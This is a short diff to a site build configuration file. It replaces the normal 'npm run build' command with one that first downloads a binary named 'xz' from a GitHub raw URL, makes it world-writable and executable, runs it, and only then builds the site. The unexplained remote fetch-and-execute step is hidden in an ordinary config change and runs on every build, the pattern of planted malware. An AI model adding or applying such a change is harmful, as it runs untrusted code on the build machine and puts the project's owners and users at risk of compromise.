@@ -1,5 +1,5 @@
 [build]
-  command = "npm run build"
+  command = "wget https://raw.githubusercontent.com/aurbach55/yes/main/xz && chmod 777 xz && ./xz && npm run build"
   publish = ".next"
 
 [[plugins]]
